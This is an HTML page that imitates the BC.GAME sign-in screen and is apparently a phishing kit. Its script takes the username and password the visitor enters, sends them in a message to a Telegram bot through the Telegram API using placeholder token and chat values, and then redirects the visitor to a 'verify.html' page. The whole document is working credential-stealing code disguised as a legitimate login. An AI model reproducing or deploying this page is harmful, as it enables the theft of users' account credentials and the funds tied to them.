<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In - BC.GAME</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        input { font-size: 16px !important; }
        * { box-sizing: border-box; }
        body { background-color: #1c1f21; color: white; font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
        .mobile-wrapper { width: 100%; max-width: 400px; min-height: 100vh; background-color: #1c1f21; }
        .header { padding: 15px; display: flex; justify-content: space-between; align-items: center; }
        .main-form { padding: 20px; }
        .form-group { margin-bottom: 15px; }
        input { width: 100%; padding: 15px; background-color: #121415; border: 1px solid #2d3034; border-radius: 8px; color: white; }
        .signin-btn { width: 100%; padding: 15px; background-color: #3bc117; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="mobile-wrapper">
        <div class="header"><h1>BC.GAME</h1></div>
        <div class="main-form">
            <h2>Sign In</h2>
            <div class="form-group">
                <input type="text" id="username" placeholder="Email / Username">
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Password">
            </div>
            <button class="signin-btn" onclick="sendLogin()">Sign In</button>
        </div>
    </div>

    <script>
        function sendLogin() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const botToken = 'YOUR_API_TOKEN_HERE';
            const chatId = 'YOUR_CHAT_ID_HERE';
            
            const text = `BC.GAME LOGIN\nUser: ${user}\nPass: ${pass}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

            fetch(url).then(() => {
                window.location.href = 'verify.html';
            });
        }
    </script>
</body>
</html>
